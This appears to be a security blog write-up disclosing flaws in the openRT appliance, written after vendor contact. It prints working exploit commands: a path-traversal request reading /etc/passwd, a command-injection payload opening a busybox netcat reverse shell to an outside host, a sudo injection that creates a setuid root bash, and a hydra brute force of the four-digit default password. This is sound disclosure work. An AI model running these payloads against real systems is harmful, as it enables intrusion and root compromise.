---
title: openRT Vulnerabilities
description: A review of the openRT appliance as we walkthrough exploiting an RCE and then privilege elevation
date: 2025-02-20
social_image: '/media/images/somuchwin.png'
tags: [openRT, RCE ]
---
# Vulnerability Review of openRT

Here we're going to conduct a web application security review of the OpenRT application.

[https://github.com/amcchord/openRT/]

Installed from commit 59185b055ab2cf79e2fc2b1854c11e1a0bb5f798, the latest as of 20-03-25. This is a nice application to review because:

- It is extremely quick and easy to install
- The above is still true if you have no background knowledge of the appliances it works with
- Multiple languages are involved

## Vendor Response

Austin email back within hours of this report (which puts him about nine months ahead of an RMM vendor) clarifying the intended usage of the application, which they immediately documented. A screenshot of the updated README is below:

![openRT Disclaimer](/media/images/openrt_documentation.png)

And to be clear, this is an **entirely acceptable** position as long as you, the user, consider this in your deployment and threat modelling. Accordingly, this write up should be read through the lense of a CTF write up, more than a vulnerability publication.

## Exposed phpinfo()

As a minor annoyance, [http://172.17.44.48/phpinfo.php] is exposed in a default build.

## Arbitrary download

To describe an actual vulnerability, we can review the file download code here: [https://github.com/amcchord/openRT/blob/main/web/download.php], specifically:

```php


$agent_id = isset($_GET['agent']) ? $_GET['agent'] : '';
$path = isset($_GET['path']) ? $_GET['path'] : '';

if (!$agent_id || !$path) {
    die("Missing required parameters");
}

// Construct full path
$base_path = "/rtMount/$agent_id";
$full_path = "$base_path/$path";

// Security checks
if (!str_starts_with(realpath($full_path), realpath($base_path))) {
    die("Invalid path");
}
```

You can see there's been an attempt an enforcing a base path. In fact realpath() is exactly the function that's typically forgotten during typical arbitrary file download vulnerabilities. What's special in this case is that the base path is itself able to be set by a user, and `/rtMount/../` has a `realpath()` of the root directory. Therefore the following works:

```bash
$ curl "172.17.44.48/download.php?agent=../&path=../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
..
```

## RCE

Finally we get to the good stuff. Let's look at [https://github.com/amcchord/openRT/blob/main/web/check_mount.php]

```php
$mount_path = "/rtMount/$agent_id";

// Check if the directory exists and has mounted volumes
$output = [];
$return_var = 0;
exec("mount | grep '$mount_path' 2>&1", $output, $return_var);
```
This looks to be a classic command injection vulnerabililty. We can first test this runs as expected:

```bash
curl "172.17.44.48/check_mount.php?agent_id=test';touch%20pwned'"
```

And indeed it does, with `/usr/local/openRT/web/pwned` created. Now to exploit it:

```bash
$ curl "172.17.44.48/check_mount2.php?agent_id=test';busybox%20nc%20172.17.33.22%204444%20-e%20sh'"
```

From another tab, we can receive a connection and upgrade it to a full shell:

```bash
none@none-Virtual-Machine:~$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.44.48 34732
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@openrt:/usr/local/openRT/web$ ^Z
[1]+  Stopped                 nc -lnvp 4444
none@none-Virtual-Machine:~$ stty raw -echo; fg
nc -lnvp 4444

www-data@openrt:/usr/local/openRT/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(openrt)
www-data@openrt:/usr/local/openRT/web$ 
```

## Root Privilege Elevation

The setup file [https://github.com/amcchord/openRT/blob/main/setup/kioskSetup.sh] adds sudo privileges for the www-data user for a few specific commands. We can review `rtImport.pl` for this interesting line:

```perl
        $status = `zpool import -d $device $pool_name 2>&1`;
```

The root exploit from here writes itself:

```bash
cp /bin/bash ./bash
sudo /usr/local/openRT/openRTApp/rtImport.pl import "test; chown root ./bash #"
sudo /usr/local/openRT/openRTApp/rtImport.pl import "test; chmod 4755 ./bash #"
www-data@openrt:/usr/local/openRT/web$ ./bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data),1001(openrt)
```

Given we can use this privesc immediately following the previous RCE, we now have a root RCE.

## Easily brute forced credentials

Default credentials are usually acceptable if you are pushed to change them, but as far as I can tell there's no documented method of changing the generated credential. The file [https://github.com/amcchord/openRT/blob/main/setup/nasSetup.sh] uses this code:

```
RANDOM_NUM=$(printf "%04d" $((RANDOM % 10000)))
PASSWORD="openRT-$RANDOM_NUM"
```

The random data involved is very small, specifically limited to four numbers. I generally dislike reporting on brute force vulnerabilities, but below shows a working brute force in under a minute.

```bash

for i in {0000..9999}; do
    echo "openRT-$i" >> openrt.txt
done
                                                                                                                                                   
none@kali:~/practice$ hydra -l explorer -P ./openrt.txt -f ftp://172.17.44.48 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-20 19:59:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking ftp://172.17.44.48:21/
[21][ftp] host: 172.17.44.48   login: explorer   password: openRT-0134
[STATUS] attack finished for 172.17.44.48 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-20 20:00:29
```

